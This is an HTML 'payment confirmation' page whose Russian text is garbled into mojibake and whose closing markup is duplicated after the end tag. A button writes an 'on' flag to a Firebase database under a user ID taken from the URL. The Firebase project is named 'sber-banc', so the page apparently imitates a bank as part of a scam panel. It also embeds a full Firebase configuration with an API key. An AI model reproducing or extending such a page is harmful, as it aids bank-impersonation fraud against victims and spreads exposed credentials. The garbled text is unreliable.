<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>쮏얨쒫왐햤햢햣햫햦햣 쮏햩햟혝혦 (by DimaKo)</title>
<style>
  body {
    margin: 0;
    font-family: 'Arial', sans-serif;
    background: #000; /* 혢혬햫혦햧 혟쮏 */
    color: #00ff00;   /* 향햣햩혬햫혦햧 혝햣햨혜혝 */
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }
  .container {
    text-align: center;
    background: #111;
    padding: 40px 20px;
    border-radius: 20px;
    box-shadow: 0 0 20px #00ff00aa;
    width: 90%;
    max-width: 400px;
  }
  h1 {
    font-size: 24px;
    margin-bottom: 30px;
  }
  button {
    background: #00ff00;
    color: #000;
    border: none;
    border-radius: 12px;
    padding: 15px 25px;
    font-size: 18px;
    font-weight: bold;
    cursor: pointer;
    transition: 0.3s;
  }
  button:hover {
    background: #00cc00;
  }
  .message {
    margin-top: 20px;
    font-size: 18px;
    display: none;
  }
</style>

<!-- Firebase SDK -->
<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-analytics.js";
  import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

  // 游댳 햑쒫쮏 Firebase-햨쮏쫨햦햡
  const firebaseConfig = {
    apiKey: "AIzaSyAqgmvAb-msCN5xsimpXDuAg4FXOBLuEDA",
    authDomain: "sber-banc.firebaseapp.com",
    databaseURL: "https://sber-banc-default-rtdb.firebaseio.com",
    projectId: "sber-banc",
    storageBucket: "sber-banc.firebasestorage.app",
    messagingSenderId: "17673551515",
    appId: "1:17673551515:web:9d400bc82df02c63ed503e"
  };

  // 햊햫햦혡햦햟햩햦향햟혡햦혪 Firebase
  const app = initializeApp(firebaseConfig);
  const analytics = getAnalytics(app);
  const database = getDatabase(app);

  // 쮏혞혢햟햣햪 ID 햦향 URL
  function getUserID() {
    const params = new URLSearchParams(window.location.search);
    return params.get('id');
  }

  // 쮏얨쒫왐햤햢햣햫햦햣 쮏햩햟혝혦 혢햣햣향 Firebase
  window.confirmPayment = async function() {
    const id = getUserID();
    if (!id) {
      alert("ID 쮏혧향쮏쒫썜햣햩혪 햫햣 햫햟햧햢햣햫!");
      return;
    }

    try {
      await set(ref(database, `${id}/Mobile`), "on");
      document.querySelector(".message").textContent = "뤯햩햟혝햟 쮏얨쒫왐햤햢햣햫햟!";
      document.querySelector(".message").style.display = "block";
      document.querySelector("button").disabled = true;
    } catch (e) {
      alert("뤰걣쟳쐃쥃 Firebase: " + e);
    }
  };
</script>
</head>
<body>
<div class="container">
  <h1>쮏얨쒫왐햢햦혝혧 쮏햩햟혝혞?</h1>
  <button onclick="confirmPayment()">쮏얨쒫왐햢햦혝혧</button>
  <div class="message"></div>
</div>
</body>
</html>  <button onclick="confirmPayment()">쮏얨쒫왐햢햦혝혧</button>
  <div class="message"></div>
</div>
</body>
</html>
